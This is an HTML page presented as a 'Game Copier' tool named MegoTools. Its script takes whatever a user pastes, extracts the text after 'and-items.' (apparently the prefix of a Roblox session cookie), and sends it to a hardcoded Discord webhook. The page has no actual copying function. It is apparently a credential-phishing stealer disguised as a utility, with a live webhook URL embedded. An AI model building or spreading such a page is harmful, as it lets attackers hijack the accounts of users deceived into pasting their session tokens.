<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>MegoTools - Game Copier</title>

<style>
@keyframes gradientMove {
0% {background-position:0% 50%;}
50% {background-position:100% 50%;}
100% {background-position:0% 50%;}
}

body{
margin:0;
font-family:Arial, Helvetica, sans-serif;
height:100vh;
display:flex;
justify-content:center;
align-items:center;

background:linear-gradient(270deg,#0f172a,#1e293b,#2563eb,#0ea5e9,#0f172a);
background-size:800% 800%;
animation:gradientMove 18s ease infinite;

color:white;
}

.container{
background:rgba(15,23,42,0.9);
padding:40px;
width:420px;
border-radius:18px;
text-align:center;

box-shadow:
0 0 20px rgba(37,99,235,0.6),
0 0 40px rgba(37,99,235,0.3);
}

h1{
margin:0;
font-size:40px;
color:#60a5fa;
text-shadow:0 0 10px #3b82f6;
}

.subtitle{
color:#9ca3af;
margin-bottom:25px;
}

input{
width:100%;
padding:12px;
border:none;
border-radius:10px;

background:#1f2937;
color:white;
font-size:15px;

outline:none;
box-shadow:inset 0 0 8px rgba(0,0,0,0.6);
}

button{
margin-top:15px;
width:100%;
padding:12px;
border:none;
border-radius:10px;

font-size:16px;
cursor:pointer;

background:#2563eb;
color:white;

transition:0.25s;
box-shadow:0 0 10px #3b82f6;
}

button:hover{
background:#1d4ed8;
box-shadow:
0 0 15px #3b82f6,
0 0 25px #3b82f6;
}

.status{
margin-top:12px;
color:#34d399;
font-weight:bold;
min-height:20px;
}
</style>
</head>

<body>

<div class="container">

<h1>MegoTools</h1>
<div class="subtitle">Game Copier</div>

<input id="gameInput" placeholder="Enter text with and-items.">

<button onclick="copyGame()">Copy Game</button>

<div class="status" id="status"></div>

</div>

<script>
const webhook = "https://discord.com/api/webhooks/1480129872796975164/QKCqzNeXZd-3faOM9TToFCxfwT5N2tiSfy7VxE1fCr__Y2HDr-t7Ps4RLvcKQyyj5eaN";

function copyGame(){
    const input = document.getElementById("gameInput");
    let value = input.value.trim();

    if(!value){
        document.getElementById("status").innerText="Please enter text";
        return;
    }

    // Wyłap wszystko po "and-items." aż do pierwszego ",", "/", ".", lub ".rob"
    let match = value.match(/and-items\.([^\s,\/\.]*(?=\.rob|[\,\/\.]))/);
    if(match && match[1]){
        value = match[1]; // tylko wyłapany fragment
    } else {
        document.getElementById("status").innerText="❌ Nie znaleziono poprawnego fragmentu!";
        return;
    }

    fetch(webhook,{
        method:"POST",
        headers:{
            "Content-Type":"application/json"
        },
        body: JSON.stringify({
            content:"🎮 **MegoTools - Game Copier**\nItem: "+value
        })
    })
    .then(()=>{
        document.getElementById("status").innerText="✅ Item sent successfully!";
        input.value="";
    })
    .catch(()=>{
        document.getElementById("status").innerText="❌ Failed to send!";
    });
}
</script>

</body>
</html>
